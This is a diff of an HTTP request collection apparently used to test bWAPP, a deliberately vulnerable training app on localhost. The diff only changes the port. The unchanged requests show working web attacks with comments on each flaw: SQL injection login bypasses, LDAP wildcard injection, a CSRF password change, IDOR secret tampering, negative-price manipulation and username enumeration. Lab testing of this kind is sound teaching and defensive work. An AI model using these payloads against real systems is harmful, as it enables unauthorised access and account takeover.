@@ -15,7 +15,7 @@
 ###   there is nothing to brute force - just read them.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/login.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Content-Type: application/x-www-form-urlencoded
 
 login=bee&password=bug&security_level=0&form=submit
@@ -28,7 +28,7 @@ login=bee&password=bug&security_level=0&form=submit
 ###   The '#' comments out the password half of the WHERE clause.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/ba_insecure_login_1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -43,7 +43,7 @@ login=admin%27%20OR%20%271%27%3D%271%27%20%23&password=anything&form=submit
 ###   renders the matched user's record.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/ba_insecure_login_2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -55,7 +55,7 @@ login=bee&password=totally-wrong-password&form=submit
 ### AUTH-04  Broken login #3 - loose/weak password comparison
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/ba_insecure_login_3.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -69,7 +69,7 @@ login=bee&password=bug&form=submit
 ###   this into a reliable account list before any password attack.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/ba_forgotten.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -78,7 +78,7 @@ login=A.I.M.&form=submit
 ###
 ### AUTH-15  Negative control - the same endpoint for an account that does not exist
 POST {{baseUrl}}/ba_forgotten.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -91,7 +91,7 @@ login=no-such-user-xyz&form=submit
 ###   The policy check is advisory only; the change still succeeds.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/ba_weak_pwd.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -106,7 +106,7 @@ login=bee&password=1&form=submit
 ###   Reset it afterwards with AUTH-08.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/csrf_1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -118,7 +118,7 @@ password=pwned&password_conf=pwned&form=submit
 ### AUTH-08  Restore the lab password after AUTH-07
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/password_change.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -132,7 +132,7 @@ password=bug&password_conf=bug&form=submit
 ###   text/plain - no admin check, no ownership check, no rate limit.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/secret.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200 text/plain "Your secret: <value>"
 
@@ -144,7 +144,7 @@ Cookie: {{authCookie}}
 ###   Verify with AUTH-09 while logged in as the admin account.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/insecure_direct_object_ref_1.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -160,7 +160,7 @@ login=A.I.M.&secret=pwned-by-idor&action=change
 ###   (uid=*)(password=*) style - i.e. the server is queried anonymously.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/ldap_connect.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -175,7 +175,7 @@ login=*&password=*&form=submit
 ###   attacker is paid to buy.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/insecure_direct_object_ref_2.php?ticket_quantity=2&ticket_price=-100&action=go HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, ticket total shows a negative amount
 
@@ -188,7 +188,7 @@ Cookie: {{authCookie}}
 ###   architectural flaw in bWAPP: the security control is client-side only.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/sqli_1.php?title=%27%20OR%201%3D1--%20-&action=go HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=2
 ### Expected: 200, all 9 movies - SQLi succeeds while the app believes it is
 ###           running at the "high" security level
@@ -201,7 +201,7 @@ Cookie: PHPSESSID={{session}}; security_level=2
 ###   compare the attributes with your own policy baseline.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/login.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Content-Type: application/x-www-form-urlencoded
 
 login=bee&password=bug&security_level=0&form=submit
